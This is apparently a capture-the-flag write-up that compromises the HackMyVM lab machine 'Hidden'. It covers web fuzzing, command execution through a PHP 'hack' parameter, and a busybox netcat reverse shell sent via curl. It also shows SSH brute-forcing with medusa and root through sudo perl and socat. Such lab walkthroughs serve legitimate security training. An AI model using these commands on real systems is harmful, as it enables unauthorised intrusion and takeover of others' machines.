# Hidden

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Hidden | noname | Beginner | HackMyVM |

**Summary:** Hidden is a beginner-level machine from HackMyVM that involves web enumeration, solving a puzzle to find a domain name, and exploiting a parameter in a PHP script for initial access. Privilege escalation involves abusing sudo rights for `perl` to pivot to another user, cracking a password found in a hidden file, and finally exploiting sudo rights for `socat` to gain root access.

---

## Reconnaissance

The initial network scan reveals the target IP address to be `192.168.100.122`.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.122 08:00:27:97:AF:75 VirtualBox
```

A subsequent Nmap scan identifies two open ports: 22 (SSH) and 80 (HTTP).

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hidden]
└─$ nmap -sC -sV -p- -T4 192.168.100.122
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-20 13:23 WIB
Nmap scan report for 192.168.100.122
Host is up (0.0021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 b8:10:9f:60:e6:2b:62:cb:3a:8c:8c:60:4b:1d:99:b9 (RSA)
|   256 64:b5:b8:e6:0f:79:23:4d:4a:c0:9b:0f:a7:75:67:c9 (ECDSA)
|_  256 d1:11:e4:07:8a:fe:06:72:64:62:28:ca:e3:29:7b:a0 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Level 1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.07 seconds
```

Visiting port 80 shows a "Welcome to level 1" message and an image asking to be decoded.

![80](image.png)

Checking the source code reveals a hint about the format `xxx.xxxxxx.xxx` and the image filename `decodethis_pls.png`.

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Level 1</title>
        <style>
        	body{
        		background-color: #b0b0b0;
        	}
        </style>
    </head>

    <body> 
        <h1><center>Welcome to level 1</center></h1>
        	<center><img src="decodethis_pls.png"></center>
    </body> 
    <!-- format xxx.xxxxxx.xxx -->
</html>
```

The image contains a Rosicrucian cipher.

![rosicrucian](image-2.png)

Decoding the cipher yields `SYS.HIDDEN.HMV`, which matches the hint format. We add this domain to our `/etc/hosts` file.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hidden]
└─$ echo '192.168.100.122 SYS.HIDDEN.HMV' | sudo tee -a /etc/hosts
[sudo] password for ouba:
192.168.100.122 SYS.HIDDEN.HMV

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hidden]
└─$ grep 192.168.100.122 /etc/hosts
192.168.100.122 SYS.HIDDEN.HMV
```

With the domain configured, we run `feroxbuster` to enumerate directories on the virtual host.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hidden]
└─$ feroxbuster -u http://SYS.HIDDEN.HMV/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt

...
301      GET        9l       28w      316c http://sys.hidden.hmv/users => http://sys.hidden.hmv/users/
301      GET        9l       28w      318c http://sys.hidden.hmv/members => http://sys.hidden.hmv/members/
200      GET        5l        8w      110c http://sys.hidden.hmv/users/secret.txt
200      GET       55l      308w    19271c http://sys.hidden.hmv/members/7573185_0.webp
200      GET     2672l     8889w   650515c http://sys.hidden.hmv/mapascii.jpg
200      GET       17l       24w      282c http://sys.hidden.hmv/
301      GET        9l       28w      317c http://sys.hidden.hmv/weapon => http://sys.hidden.hmv/weapon/
...
```

The `/weapon` directory looks interesting. We fuzz it further with `ffuf` to find hidden files.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hidden]
└─$ ffuf -u http://sys.hidden.hmv/weapon/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .txt,.php,.html -ic

...
loot.php                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
...
```

We find `loot.php`, but it returns an empty response (Size: 0). This suggests it might expect a parameter. We fuzz for parameters using `ffuf`, filtering out the empty size responses (`-fs 0`).

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hidden]
└─$ ffuf -u http://sys.hidden.hmv/weapon/loot.php?FUZZ=whoami -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fs 0

...
hack                    [Status: 200, Size: 9, Words: 1, Lines: 2, Duration: 219ms]
```

The `hack` parameter is discovered.

---

## Initial Access

We confirm Remote Code Execution (RCE) by sending a command to the `hack` parameter. To gain a reverse shell, we set up a netcat listener and send a payload.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hidden]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The payload used is: `busybox nc 192.168.100.1 4444 -e /bin/bash`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hidden]
└─$ curl http://sys.hidden.hmv/weapon/loot.php?hack=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash
```

We successfully catch the shell as `www-data`.

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 63567
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We upgrade the shell to a fully interactive TTY.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@hidden:/var/www/hidden/weapon$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hidden]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@hidden:/var/www/hidden/weapon$ export SHELL=bash
www-data@hidden:/var/www/hidden/weapon$ export TERM=xterm
www-data@hidden:/var/www/hidden/weapon$ stty rows 100 cols 200
www-data@hidden:/var/www/hidden/weapon$ reset
```

---

## Privilege Escalation

We check `/etc/passwd` to see other users on the system.

```bash
www-data@hidden:/var/www/hidden$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
atenea:x:1000:1001:,,,:/home/atenea:/bin/bash
toreto:x:1001:1000:,,,:/home/toreto:/bin/bash
```

Users `atenea` and `toreto` are present. Checking `sudo -l` for the current user reveals we can run `/usr/bin/perl` as `toreto` without a password.

```bash
www-data@hidden:/var/www/hidden$ sudo -l
Matching Defaults entries for www-data on hidden:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on hidden:
    (toreto) NOPASSWD: /usr/bin/perl
```

![gtfo_perl](image-1.png)

We exploit this to pivot to the `toreto` user.

```bash
www-data@hidden:/var/www/hidden$ sudo -u toreto /usr/bin/perl -e 'exec "/bin/bash"'
toreto@hidden:/var/www/hidden$
```

As `toreto`, we explore `atenea`'s home directory and find a hidden folder `.hidden` containing a file `atenea.txt`.

```bash
toreto@hidden:~$ cd /home/atenea/.hidden/
toreto@hidden:/home/atenea/.hidden$ ls -la
total 16
drwxr-xr-x 2 atenea atenea 4096 May 22  2021 .
drwxr-xr-x 4 atenea atenea 4096 May 23  2021 ..
-rw------- 1 toreto toreto 6170 May 22  2021 atenea.txt
```

The file contains a list of strings that look like potential passwords.

```bash
toreto@hidden:/home/atenea/.hidden$ cat atenea.txt
sys7959hmv
sys7988hmv
...
sys8518hmv
```

We transfer this list to our attacking machine to perform a brute-force attack on SSH or `su` for the `atenea` user.

On the target:
```bash
toreto@hidden:/home/atenea/.hidden$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

On our machine:
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hidden]
└─$ wget http://192.168.100.122:8080/atenea.txt
```

We use `medusa` to crack the password for `atenea` using the downloaded list.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hidden]
└─$ medusa -u atenea -P atenea.txt -h 192.168.100.122 -M ssh -f -t 5
...
2026-02-20 15:09:54 ACCOUNT FOUND: [ssh] Host: 192.168.100.122 User: atenea Password: sys[REDACTED] [SUCCESS]
```

The password is found to be `sys[REDACTED]`. We switch to user `atenea`.

```bash
toreto@hidden:/home/atenea/.hidden$ su - atenea
Password:
atenea@hidden:~$ id
uid=1000(atenea) gid=1001(atenea) groups=1001(atenea)
```

Checking sudo privileges for `atenea` reveals that we can run `socat` as `root` without a password.

```bash
atenea@hidden:~$ sudo -l
Matching Defaults entries for atenea on hidden:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User atenea may run the following commands on hidden:
    (root) NOPASSWD: /usr/bin/socat
```

![socat_gtfo](image-3.png)

We can use `socat` to spawn a root shell.

```bash
atenea@hidden:~$ sudo /usr/bin/socat - exec:/bin/bash,pty,ctty,raw,echo=0
bash: cannot set terminal process group (3207): Inappropriate ioctl for device
bash: no job control in this shell
root@hidden:/home/atenea#
```

We are now root and can read the flags.

```bash
root@hidden:~# id
uid=0(root) gid=0(root) groups=0(root)
root@hidden:~# cat /home/atenea/user.txt /root/root.txt
--------------------
hmv{c4H[REDACTED]}
--------------------
--------------------
hmv{2Mx[REDACTED]}
--------------------
```

---

## Attack Chain Summary
1.  **Reconnaissance**: Discovered open ports 22 and 80 via Nmap. Found a Rosicrucian cipher on the main page, which decoded to `SYS.HIDDEN.HMV`.
2.  **Vulnerability Discovery**: Enumerated the new domain to find `/weapon/loot.php`. Fuzzed parameters to discover `hack`, which allowed Remote Code Execution (RCE).
3.  **Exploitation**: Used `loot.php?hack=` to execute a reverse shell and gain initial access as `www-data`.
4.  **Internal Enumeration**: Found `sudo` rights for `www-data` to execute `perl` as user `toreto`.
5.  **Privilege Escalation**:
    *   Pivoted to `toreto` using `sudo -u toreto /usr/bin/perl -e 'exec "/bin/bash"'`.
    *   Found a password list `atenea.txt` in a hidden directory.
    *   Cracked `atenea`'s password (`sys[REDACTED]`) via SSH brute-force.
    *   Escalated to `root` by abusing `sudo` rights on `/usr/bin/socat`.
